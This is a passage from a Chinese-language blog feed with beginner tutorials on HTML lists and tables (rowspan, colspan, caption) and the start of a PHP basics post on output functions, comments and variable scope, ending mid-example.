<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/09/5c8320e82a362.jpg&quot;</span>&gt;</span><br><span class="line">  &lt;ol type=<span class="string">&quot;1&quot;</span> start=<span class="string">&quot;1&quot;</span>&gt;          &lt;!--有序列表开始--&gt;</span><br><span class="line">    &lt;li&gt;哈哈，这里是第一条有序列表&lt;/li&gt;</span><br><span class="line">  </span><br><span class="line">     &lt;ul type=<span class="string">&quot;circle&quot;</span>&gt;            &lt;!--无序列表开始--&gt;</span><br><span class="line">          &lt;li&gt;这里是第一条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第二条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;                         &lt;!--无序列表结束--&gt;</span><br><span class="line">    </span><br><span class="line">     &lt;ul type=<span class="string">&quot;disc&quot;</span>&gt;</span><br><span class="line">          &lt;li&gt;这里是第三条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第四条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">  &lt;br&gt;  </span><br><span class="line">  &lt;li&gt;哈哈，这里是第二条有序列表&lt;/li&gt;</span><br><span class="line">  </span><br><span class="line">     &lt;ul type=<span class="string">&quot;square&quot;</span>&gt;</span><br><span class="line">          &lt;li&gt;这里是第五条无序列表&lt;/li&gt;   </span><br><span class="line">          &lt;li&gt;这里是第六条无序列表&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;  </span><br><span class="line">  &lt;/ol&gt;                             &lt;!--有序列表结束--&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;ol type=<span class="string">&quot;a&quot;</span> start=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">     &lt;li&gt;哈哈，这里是第三条有序列表&lt;/li&gt;</span><br><span class="line">   &lt;br&gt;</span><br><span class="line">     &lt;li&gt;哈哈，这里是第四条有序列表&lt;/li&gt;</span><br><span class="line">  &lt;/ol&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;dl&gt;</span><br><span class="line">            &lt;dt&gt;我是第一个自定义列表的列表项&lt;/dt&gt;</span><br><span class="line">                &lt;dd&gt;我是第一个自定义列表的列表项的描述&lt;/dd&gt;          </span><br><span class="line">  &lt;/dl&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c832ded3bac1.png" alt="7.png"></p>
<p>可参读博文：<font color="#00B2EE">《<a href="https://www.cnblogs.com/yyhh/p/4208951.html">HTML表格与列表</a>》</font> </p>
<br>

<br>

<h3 id="四-HTML-表格"><a href="#四-HTML-表格" class="headerlink" title="四. HTML 表格"></a><font color="#FF6347" face="Comic sans MS">四. HTML 表格</font></h3><p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、表格</strong></font></p>
<p>网页中有类似word里面的功能，当然，也会有类似excel里面的功能，表格就是其中之一。</p>
<p>表格由 <code>&lt;table&gt;</code> 标签来定义。每个表格均有若干行（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干单元格（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。</p>
<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格的结构</strong></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;table&gt;                         &lt;!--定义表格--&gt;</span><br><span class="line"></span><br><span class="line">        &lt;tr&gt;                    &lt;!--定义一行--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;       &lt;!--定义一个标题单元格--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/th&gt;</span><br><span class="line"></span><br><span class="line">                &lt;th&gt;&lt;/&lt;th&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">        &lt;tr&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;       &lt;!--定义一个单元格--&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">                &lt;td&gt;&lt;/td&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、表格标签及属性</strong></font></p>
<p><strong>注：</strong>属性是区分大小写的，bgColor如果写成bgcolor是没有效果的</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong><code>&lt;table&gt;&lt;/table&gt;</code></strong> 表，----&gt;可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>Width</code>**：表格宽度，单位可以是百分比，也可以是固定值。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Height</code>**：表格高度。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> center</li>
<li><input disabled="" type="checkbox"> right</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Border</code>**：边框粗细。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Bordercolor</code>**：边框颜色。取值：rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：表格背景色（<font color="#FF7F00">不赞成使用该属性</font>）。取值： rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>background</code>**：背景图片，取值：URL</li>
<li><input disabled="" type="checkbox"> **<code>cellpadding</code>**：单元格边线到内容间的距离(填充距离)。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>cellspacing</code><strong>：单元格与单元格之间的距离(间距)，默认是双线</strong>，这个很重要</strong><br>取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> <strong><code>rules</code><strong>：合并单元格边框线，取值：all。</strong>注意：</strong>rules兼容性不好，请使用CSS来取代它。</li>
<li><input disabled="" type="checkbox"> **<code>summary</code>**：摘要，使搜索引擎更好的读懂表格内容，更好的帮助特殊用户读取表格内容。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> text</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;caption&gt;&lt;/caption&gt;</code>**：定义表格标题。可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格水平对齐方式（<font color="#FF7F00">不赞成使用该属性</font>），取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> top</li>
<li><input disabled="" type="checkbox"> rightbottom</li>
<li><input disabled="" type="checkbox"> bottom</li>
</ul>
</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;tr&gt;&lt;/tr&gt;</code>**：行标记。可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：行的背景色。取值： rgb(x,x,x)、#xxxxxx、colorname</li>
<li><input disabled="" type="checkbox"> **<code>Height</code>**：行高度。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> pixels</li>
<li><input disabled="" type="checkbox"> %</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>Align</code>**：表格内容对齐方式。取值： ↓↓<ul>
<li><input disabled="" type="checkbox"> left</li>
<li><input disabled="" type="checkbox"> center</li>
<li><input disabled="" type="checkbox"> right</li>
<li><input disabled="" type="checkbox"> justify</li>
<li><input disabled="" type="checkbox"> char</li>
</ul>
</li>
<li><input disabled="" type="checkbox"> **<code>valign</code>**：属性趋向于垂直对齐，其值包含：top、bottom、middle、baseline</li>
</ul>
</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;th&gt;&lt;/th&gt;</code>**：标题单元格（每列第一行），居中加粗显示。</li>
<li><input checked="" disabled="" type="checkbox"> **<code>&lt;td&gt;&lt;/td&gt;</code>**：普通单元格。<code>&lt;th&gt;</code>和<code>&lt;td&gt;</code>可选属性： ↓↓<ul>
<li><input disabled="" type="checkbox"> **<code>height</code>**：单元格高度</li>
<li><input disabled="" type="checkbox"> **<code>width</code>**：单元格宽度</li>
<li><input disabled="" type="checkbox"> **<code>bgColor</code>**：单元格背景色</li>
<li><input disabled="" type="checkbox"> **<code>background</code>**：单元格背景图片</li>
<li><input disabled="" type="checkbox"> **<code>align</code>**：水平对齐</li>
<li><input disabled="" type="checkbox"> **<code>valign</code>**：垂直水齐</li>
<li><input disabled="" type="checkbox"> **<code>rowspan</code>**：<font color="#FF7F00"><strong>上下单元格合并。合并属性必须放在第一个单元格中。</strong></font></li>
<li><input disabled="" type="checkbox"> **<code>colspan</code>**：<font color="#FF7F00"><strong>左右单元格合并。合并时，有增就得有减，要保证每一行单元格的个数不变。</strong></font></li>
</ul>
</li>
</ul>
<br>

<br>

<p><font color="#00B2EE" face="Microsoft YaHei"><strong>三、表格标签示例</strong></font></p>
<ol>
<li><code>&lt;table&gt;、&lt;tr&gt;、&lt;th&gt;、&lt;td&gt;</code>示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;th&gt;工号&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;姓名&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;职位&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">001</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小明&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;设计师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">002</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小方&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;工程师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">003</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小白&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;程序员&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c836d74b4ebb.png" alt="8.png"></p>
<br>

<br>

<ol start="2">
<li><code>&lt;caption&gt;&lt;/caption&gt;</code>表格标题示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;300&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">         &lt;caption&gt;<span class="number">2019.3</span>月日历&lt;/caption&gt;   &lt;!--放在&lt;table&gt;&lt;/table&gt;中间--&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;th&gt;工号&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;姓名&lt;/td&gt;</span><br><span class="line">             &lt;th&gt;职位&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">001</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小明&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;设计师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">002</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小方&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;工程师&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">             &lt;td&gt;<span class="number">003</span>&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;小白&lt;/td&gt;</span><br><span class="line">             &lt;td&gt;程序员&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c836e941fa2e.png" alt="10.png"></p>
<br>

<br>

<ol start="3">
<li>空表格、跨行或者跨列表格示例：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;table&gt;   &lt;!--建立空表，无属性--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">         &lt;td&gt;zdd&lt;/td&gt;</span><br><span class="line">         &lt;td&gt;<span class="number">30</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">         &lt;td&gt;ddz&lt;/td&gt;</span><br><span class="line">         &lt;td&gt;<span class="number">27</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">   &lt;/table&gt;</span><br><span class="line">  </span><br><span class="line">&lt;br&gt;         &lt;!--合并左右单元格--&gt;</span><br><span class="line">     &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">            cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;th colspan=<span class="string">&quot;2&quot;</span>&gt;电话&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;Bill Gates&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">854</span>&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">855</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/table&gt; </span><br><span class="line">   </span><br><span class="line">&lt;br&gt;         &lt;!--合并上下单元格--&gt;</span><br><span class="line">   &lt;table border=<span class="string">&quot;2&quot;</span> width=<span class="string">&quot;400&quot;</span> height=<span class="string">&quot;100&quot;</span> bordercolor=<span class="string">&quot;blue&quot;</span> bgColor=<span class="string">&quot;#88cc66&quot;</span> </span><br><span class="line">          cellspacing=<span class="string">&quot;0&quot;</span> cellpadding=<span class="string">&quot;2&quot;</span> rules=<span class="string">&quot;all&quot;</span>&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;姓名&lt;/th&gt;</span><br><span class="line">        &lt;td&gt;Bill Gates&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th rowspan=<span class="string">&quot;2&quot;</span>&gt;电话&lt;/th&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">854</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;<span class="number">555</span> <span class="number">77</span> <span class="number">855</span>&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;/table&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/09/5c83737340e28.png" alt="11.png"></p>
<br>

<br>

<h3 id="五-HTML-表单"><a href="#五-HTML-表单" class="headerlink" title="五. HTML 表单"></a><font color="#FF6347" face="Comic sans MS">五. HTML 表单</font></h3><br>

<p>表单很简单，在HTML里它就是用来人与服务器的交互，或者说是HTML的输入输出交互的重要功能！</p>
<p>表单后续有时间再详细叙述吧，或者可以看在本站博文就有开始使用了….<font color="#00B2EE">《<a href="https://directoree.top/post/PHP-MySQL">PHP操作MySQL数据库</a>》</font></p>
<br />

<br />

<h3 id="六-CSS"><a href="#六-CSS" class="headerlink" title="六. CSS"></a><font color="#FF6347" face="Comic sans MS">六. CSS</font></h3><p><font color="#00B2EE">《<a href="https://directoree.github.io/post/HTML-CSS">CSS 基础</a>》</font></p>
<p>本文参考：<br><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html">html&#x2F;css快速入门</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html">HTML+CSS基础入门教程</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/24737.html">HTML极速入门(2018版)</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/5007.html">弹指间学会HTML视频教程</a>》</font></p>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础语法</title>
    <url>/post/PHP-1/</url>
    <content><![CDATA[<p>年後の新作2.14(。・∀・)ノ   </p>
<p>本文参考PHP中文网：<font color="#00B2EE">[<a href="http://www.php.cn/code/4800.html">PHP入门教程之一周学会PHP</a>]</font>&amp;emsp;<font color="#00B2EE">[<a href="http://www.php.cn/code/4760.html">PHP入门视频教程之一周学会PHP</a>]</font><br>资料查阅：<font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/php_string.asp">W3shcool PHP 教程</a>]</font><br>&amp;emsp;<br>&amp;emsp;</p>
<span id="more"></span>

<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP</font></center>




<p>&amp;emsp;</p>
<h3 id="一、-PHP基础语法"><a href="#一、-PHP基础语法" class="headerlink" title="一、 PHP基础语法"></a><font color="#FF6347" face="Comic sans MS">一、 PHP基础语法</font></h3><h4 id="1-1-PHP-语法"><a href="#1-1-PHP-语法" class="headerlink" title="1.1 PHP 语法"></a><font color="#3CB371" face="Comic sans MS">1.1 PHP 语法</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP基础语法</strong></font><br>PHP 脚本可以放在文档中的任何位置。<br>PHP 脚本以 尖括号、问号、PHP <font color="#00B2EE"><strong>&lt;?php**</font>开始，以 <font color="#00B2EE"></strong>?&gt;<strong></font> 问号、尖括号结束。<br>PHP 文件的默认文件扩展名是 “<font color="#00B2EE"></strong>.php**</font>“。<br>PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">     //这里是我们要写的PHP代码</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><br><font color="red"><strong>2. PHP输出语法</strong></font><br>PHP中<font color="#00B2EE"><strong>echo(), print(), print_r(), var_dump()</strong></font>的区别：<br><font color="#00B2EE"><strong>echo：</strong></font>是PHP语句, 输出一个或多个字符串。实际上它并不是一个函数，所以不必对它使用括号，直接用echo就行。print和print_r是函数,语句没有返回值,函数可以有返回值(即便没有用)。可以一次输出多个值，多个值之间用逗号分隔。echo是语言结构(language construct)，而并不是真正的函数，因此不能作为表达式的一部分使用。</p>
<p><font color="#00B2EE"><strong>print：</strong></font> 同样是一个语言结构，可以使用括号，也可以不使用括号： print 或 print()。只能打印出简单类型变量的值，如：int、string。<br>下面的实例演示了如何使用 print 命令输出字符串（字符串可以包含 HTML 标签）：</p>
<p><font color="#00B2EE"><strong>print_r()：</strong></font><br>可以把字符串和数字简单地打印出来，而数组则以括起来的键和值得列表形式显示，并以Array开头。但print_r()输出布尔值和NULL的结果没有意义，因为都是打印”\n”。因此用var_dump()函数更适合调试。</p>
<p><font color="#00B2EE"><strong>var_dump()：</strong></font><br>var_dump(传入一个变量) 输出变类型和值（最常用）。var_dump() 是一个函数。向括号()中间插入变量。这个函数，会打印出来数据类型，还会对应显示变量的长度和值。<br></font></p>
<blockquote>
<blockquote>
<p>·  echo - 可以输出一个或多个字符串<br>·  print - 只允许输出一个字符串，返回值总为 1<br>提示：echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。<br>echo 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()。</p>
</blockquote>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span>:</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$str</span>=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：hello world!abc</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>:</span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;&lt;h2&gt;PHP is fun!&lt;/h2&gt;&quot;</span>;</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;Hello world!&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="built_in">print</span> <span class="string">&quot;I&#x27;m about to learn PHP!&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">print_r()：</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$age</span>=array(18,20,24);</span><br><span class="line">    print_r(<span class="variable">$age</span>);</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：Array ( [0] =&gt; 18 [1] =&gt; 20 [2] =&gt; 24 )</span><br><span class="line"></span><br><span class="line">var_dump():</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$age</span>=array(18,20,24);</span><br><span class="line">    var_dump(<span class="variable">$age</span>);</span><br><span class="line">?&gt;</span><br><span class="line">//运行结果：array(3) &#123; [0]=&gt; int(18) [1]=&gt; int(20) [2]=&gt; int(24) &#125;</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**注意事项：**</font> 
php的代码部份全部要用半角的英文、很多人容易写成全角的英文和符号造成PHP代码报错。
PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。
PHP代码的最后一行可以加也可不加分号。由于很多学习者特别是初学者经常犯一个毛病：写完一行代码不加
分号。因此，容易报错。我们通常在公司里面规定：一行代码写完，就必须要加分号。
</font></td></tr></table>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3.PHP中的注释：</strong></font><br><font color="#00B2EE"><strong>单行注释（只注释一行）：</strong></font> <font color="#FF7F00">&#x2F;&#x2F;</font> 双斜杠表示单行注释,有时也用 # 表示,但用的比较少，多用 <font color="#FF7F00">&#x2F;&#x2F;</font><br><font color="#00B2EE"><strong>多行注释（注释多行）：</strong></font> 以 <font color="#FF7F00">&#x2F;* </font> 开始, 以<font color="#FF7F00">*&#x2F;</font>结束代表多行注释。<br></font> </p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-PHP-变量"><a href="#1-2-PHP-变量" class="headerlink" title="1.2 PHP 变量"></a><font color="#3CB371" face="Comic sans MS">1.2 PHP 变量</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. PHP中的变量有几个特点：</strong></font></p>
<ol>
<li>必须要以<font color="#FF7F00">$</font>开始。如变量x必须要写成<font color="#FF7F00">$x</font></li>
<li>变量的首字母不能以数字开始</li>
<li>变量的名字区分大小写</li>
<li>变量不要用特殊符号、中文，_不算特殊符号</li>
<li>变量命名要有意义（别写xxx，aaa，ccc这种 变量名）</li>
<li>$ 叫作美元符，英文单词：dollar。PHP的变量必须以美元符开始。说明搞PHP有“钱”图</font></li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">变量在您第一次赋值给它的时候被创建：在下面的语句执行中，变量txt将保</span><br><span class="line">存值Hello world!，且变量 x 将保存值 5。</span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$txt</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line"> <span class="variable">$x</span>=5;</span><br><span class="line"> <span class="variable">$y</span>=10.5;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>2. PHP是一门弱类型语言：</strong></font><br>在上面的实例中，我们注意到，不必向 PHP 声明该变量的数据类型。<br>PHP 会根据变量的值，自动把变量转换为正确的数据类型。<br>在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。<br></font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. PHP变量的作用域：</strong></font><font color="#00B2EE"><strong>local、global、static、parameter</strong></font><br><font color="#00B2EE"><strong>局部和全局作用域（loacal  global）：</strong></font>在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。</p>
<p><font color="#00B2EE"><strong>PHP global 关键字：</strong></font>global 关键字用于函数内访问全局变量。<br>PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$x</span>=10;</span><br><span class="line"> <span class="variable">$y</span>=20;</span><br><span class="line"> <span class="keyword">function</span> <span class="function"><span class="title">test</span></span>()&#123;</span><br><span class="line">     global <span class="variable">$x</span>,<span class="variable">$y</span>;      //使用global关键字</span><br><span class="line"> </span><br><span class="line">     <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">test</span>();</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$y</span>;//输出30</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">上面例子也可以写成：</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"> <span class="variable">$x</span>=5;</span><br><span class="line"> <span class="variable">$y</span>=10;</span><br><span class="line"> <span 